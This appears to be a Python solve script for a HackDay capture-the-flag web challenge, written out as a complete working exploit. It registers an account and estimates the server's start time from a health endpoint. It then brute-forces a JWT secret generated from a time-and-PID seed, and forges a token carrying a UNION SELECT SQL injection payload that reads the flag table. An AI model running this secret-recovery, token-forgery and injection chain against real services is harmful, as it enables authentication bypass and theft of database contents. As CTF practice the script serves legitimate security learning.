import jwt, string, random, requests, logging, math, re, time
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

BASE_URL = "http://challenges.hackday.fr:58990"
REGISTER_URL = f"{BASE_URL}/register"
LOGIN_URL = f"{BASE_URL}/login"
HEALTHZ_URL = f"{BASE_URL}/healthz"
FAVORITE_PRODUCT_INFO_URL = f"{BASE_URL}/favorite_product_info"

USERNAME = random.choice(string.ascii_letters).lower() + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(7))
PASSWORD = USERNAME


def register_user():
    """Register a new user."""
    logging.info("Registering a new user.")
    response = requests.post(REGISTER_URL, data={"username": USERNAME, "password": PASSWORD})
    if response.status_code == 200:
        logging.info("User registered successfully.")
    else:
        logging.error("Failed to register user.")


def login_user():
    """Login the user and get the JWT from cookies."""
    logging.info("Logging in the user.")
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})
    if response.status_code == 200:
        logging.info("User logged in successfully.")
        jwt_token = session.cookies.get("access_token_cookie")
        return jwt_token
    logging.error("Failed to log in user.")
    return None


def get_server_start_time():
    """Calculate the server's start time using the /healthz endpoint."""
    logging.info("Calculating server start time.")
    response = requests.get(HEALTHZ_URL)
    if response.status_code == 200:
        uptime = response.json().get("uptime")
        start_time = time.time() - uptime
        logging.info(f"Server start time calculated: {start_time}")
        return start_time
    logging.error("Failed to get server start time.")
    return None


def bruteforce_jwt_secret(start_time):
    """Bruteforce the JWT_SECRET_KEY based on the start time and PID."""
    logging.info("Starting bruteforce for JWT secret.")
    TIME_WINDOW_SECONDS = 5
    rounded_start_time = math.floor(start_time)
    possible_times = range(rounded_start_time - TIME_WINDOW_SECONDS, rounded_start_time + TIME_WINDOW_SECONDS + 1)
    for possible_up in possible_times:
        for pid in range(1, 65536):
            random.seed(possible_up + pid)
            _ = "".join(random.choice(string.printable) for _ in range(32))
            candidate_secret = "".join(random.choice(string.printable) for _ in range(32))
            try:
                jwt.decode(jwt_token, candidate_secret, algorithms=["HS256"])
                logging.info(f"JWT secret found: {candidate_secret}")
                return candidate_secret
            except jwt.InvalidTokenError:
                continue
    logging.error("Failed to bruteforce JWT secret.")
    return None


def forge_jwt(jwt_secret):
    """Forge a new JWT with an SQL injection payload."""
    logging.info("Forging a new JWT with SQL injection payload.")
    payload = {
        "sub": USERNAME,
        "favorite_product": "1 UNION SELECT 1, flag, flag, 0.0, 'static/images/default.png', 1 FROM flag LIMIT 1 --"
    }
    forged_token = jwt.encode(payload, jwt_secret, algorithm="HS256")
    logging.info("JWT forged successfully.")
    return forged_token


def get_flag(forged_token):
    """Send the forged JWT to get the flag."""
    logging.info("Sending forged JWT to retrieve the flag.")
    cookies = {"access_token_cookie": forged_token}
    response = requests.get(FAVORITE_PRODUCT_INFO_URL, cookies=cookies)
    if response.status_code == 200:
        logging.info("Successfully retrieved the response.")
        flag = re.search(r'HACKDAY\{.*?\}', response.text)
        if flag:
            logging.info(f"Succesfully retrieved the flag")
            return flag.group()
        logging.error("Flag not found in the response.")
        return response.text
    logging.error("Failed to retrieve the response.")
    return None


if __name__ == "__main__":
    register_user()
    jwt_token = login_user()

    if not jwt_token:
        logging.error("Exiting due to login failure.")
        exit(1)

    start_time = get_server_start_time()
    if not start_time:
        logging.error("Exiting due to failure in calculating server start time.")
        exit(1)

    jwt_secret = bruteforce_jwt_secret(start_time)
    if not jwt_secret:
        logging.error("Exiting due to failure in bruteforcing JWT secret.")
        exit(1)

    forged_token = forge_jwt(jwt_secret)
    flag = get_flag(forged_token)

    if flag:
        logging.info(f"Flag retrieved: {flag}")
    else:
        logging.error("Failed to retrieve the flag.")
